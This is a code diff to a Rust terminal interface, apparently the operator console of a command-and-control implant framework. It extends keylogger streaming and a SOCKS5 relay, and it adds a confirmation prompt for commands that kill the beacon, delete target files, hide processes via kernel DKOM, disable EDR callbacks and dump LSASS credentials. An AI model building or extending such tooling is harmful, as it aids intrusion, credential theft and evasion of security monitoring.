@@ -233,8 +233,8 @@ pub(crate) const META_COMMANDS: &[MetaCmd] = &[
     },
     MetaCmd {
         name: "/keylog",
-        args_hint: "<start|stop|dump>",
-        help: "keystroke logger",
+        args_hint: "<start|stop|dump|stream [secs]|unstream>",
+        help: "keystroke logger (stream = continuous dump)",
         icon: "⌨",
     },
     MetaCmd {
@@ -287,8 +287,8 @@ pub(crate) const META_COMMANDS: &[MetaCmd] = &[
     },
     MetaCmd {
         name: "/socks",
-        args_hint: "<chan> <op> <addr> <port>",
-        help: "SOCKS relay",
+        args_hint: "start [addr] | stop | <chan> <op> <addr> <port>",
+        help: "SOCKS5 relay (start/stop) or manual channel control",
         icon: "◎",
     },
     MetaCmd {
@@ -311,9 +311,15 @@ pub(crate) const META_COMMANDS: &[MetaCmd] = &[
     },
     MetaCmd {
         name: "/theme",
-        args_hint: "[mocha|highcontrast|nocolor]",
+        args_hint: "[mocha|frappe|macchiato|highcontrast|nocolor]",
         help: "switch color theme (or show current)",
         icon: "◐",
+    },
+    MetaCmd {
+        name: "/config",
+        args_hint: "[stream_cap <N>]",
+        help: "show / set runtime config (stream_cap)",
+        icon: "⚙",
     },
     MetaCmd {
         name: "/driver-status",
@@ -541,6 +547,56 @@ pub(crate) fn mask(secret: &str) -> String {
     )
 }
 
+// ---- destructive-command confirmation --------------------------------------
+
+/// Destructive commands that must prompt for y/N before dispatching.
+///
+/// Each carries a one-line human-readable description builder. The TUI's
+/// `submit` calls [`destructive_confirm`] *before* dispatch; if it returns
+/// `Some`, the command is held in a [`super::ConfirmAction`] and re-dispatched
+/// verbatim only after the operator presses `y`.
+///
+/// Pure data — the description strings live here so they're easy to audit in
+/// one place and unit-testable.
+const DESTRUCTIVE_COMMANDS: &[(&str, &str)] = &[
+    (
+        "/kill",
+        "Kill beacon session — the implant will exit immediately.",
+    ),
+    ("/rm", "Delete the file/dir on the target."),
+    (
+        "/hide",
+        "Hide process via kernel DKOM — this modifies kernel structures.",
+    ),
+    (
+        "/neutralize",
+        "Neutralize EDR callbacks — this is a kernel-level operation.",
+    ),
+    (
+        "/dump-lsass",
+        "Dump LSASS memory — this will create a credential dump.",
+    ),
+];
+
+/// If `raw` is a destructive command (per [`DESTRUCTIVE_COMMANDS`]), return
+/// the description string to show in the confirm overlay. `None` otherwise.
+///
+/// Only the first token is matched (so `/rmdir` is not `/rm`). The caller is
+/// responsible for the actual dispatch and the `confirmed` bypass flag.
+///
+/// Pure function — tested directly.
+pub(crate) fn destructive_confirm(raw: &str) -> Option<&'static str> {
+    let trimmed = raw.trim();
+    if !trimmed.starts_with('/') {
+        return None;
+    }
+    let first = trimmed.split_whitespace().next()?.to_ascii_lowercase();
+    DESTRUCTIVE_COMMANDS
+        .iter()
+        .find(|(name, _)| *name == first)
+        .map(|(_, desc)| *desc)
+}
+
 // ---- 增强分类：alias 展开 + ! 强制 shell ------------------------------------
 
 /// 增强版 [`classify`]：支持别名（alias）展开和 `!` 强制 shell。
@@ -634,5 +690,39 @@ mod tests {
     #[test]
     fn with_bang_only_is_empty() {
         assert_eq!(classify_with("!", &HashMap::new()), Input::Empty);
+    }
+
+    #[test]
+    fn destructive_kill_flags() {
+        assert!(destructive_confirm("/kill").is_some());
+        assert!(destructive_confirm("/kill  ").is_some());
+    }
+
+    #[test]
+    fn destructive_rm_with_arg() {
+        // arg shouldn't break detection — first token is what matters
+        assert!(destructive_confirm("/rm C:\\windows\\temp\\x").is_some());
+    }
+
+    #[test]
+    fn destructive_neutralize_dump_hide() {
+        assert!(destructive_confirm("/neutralize 1337").is_some());
+        assert!(destructive_confirm("/dump-lsass 500").is_some());
+        assert!(destructive_confirm("/hide 4").is_some());
+    }
+
+    #[test]
+    fn destructive_prefix_only_not_matched() {
+        // /rmdir must NOT be treated as /rm (first-token exact match)
+        assert!(destructive_confirm("/rmdir").is_none());
+        assert!(destructive_confirm("/killer").is_none());
+    }
+
+    #[test]
+    fn destructive_safe_commands_pass_through() {
+        assert!(destructive_confirm("/sessions").is_none());
+        assert!(destructive_confirm("/ls").is_none());
+        assert!(destructive_confirm("ls -la").is_none()); // shell, not slash
+        assert!(destructive_confirm("").is_none());
     }
 }
